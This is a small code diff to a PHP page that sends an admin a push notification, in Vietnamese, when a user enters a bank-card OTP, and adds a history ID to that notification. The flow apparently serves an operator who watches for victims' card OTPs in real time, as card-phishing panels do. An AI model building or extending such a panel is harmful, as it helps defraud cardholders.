@@ -105,7 +105,10 @@ if (isset($_POST['confirm_otp'])) {
                 body: new URLSearchParams({
                     'token': '<?php echo htmlspecialchars($row["token_admin"]); ?>',
                     'title': 'Thông báo từ bên user',
-                    'body': 'User vừa nhập OTP thẻ bạn hãy vào kiểm tra',
+                    'body': JSON.stringify({
+                        'message': 'User vừa nhập OTP thẻ bạn hãy vào kiểm tra',
+                        'id_history': '<?php echo htmlspecialchars($id_history); ?>' // Truyền id_history vào đây
+                    }),
                     'image': 'https://cdn.shopify.com/s/files/1/1061/1924/files/Sunglasses_Emoji.png?2976903553660223024'
                 })
             })
